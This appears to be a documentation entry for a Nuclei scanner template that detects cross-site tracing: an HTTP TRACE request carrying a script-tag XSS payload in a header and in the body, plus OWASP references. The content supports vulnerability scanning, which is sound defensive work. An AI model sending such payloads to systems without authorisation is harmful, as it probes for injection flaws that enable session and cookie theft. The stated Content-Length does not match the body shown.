# Nuclei Template: Cross Site Tracing - Cross-Site Scripting
**Template ID:** cross-site-tracing-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Low
**CWE:** CWE-80
**Source:** Nuclei Template (`cross-site-tracing-xss.yaml`)

## Vulnerability Information & PoC

## Description
Cross-site scripting vulnerability was discovered via HTTP TRACE method reflection. The TRACE method reflects the request body back in the response, which can beexploited for XSS attacks when user input is reflected without proper sanitization.

## Steps to reproduce / Exploit Payload
```http
TRACE / HTTP/1.1
Host: {{Hostname}}
Header: <script>alert(document.domain)</script>
Content-Length: 27

<script>alert(document.domain)</script>
```

## References
- https://medium.com/@tushar_rs_/cross-site-tracing-attack-xst-5aa519658b7a
- https://www.owasp.org/index.php/Cross_Site_Tracing
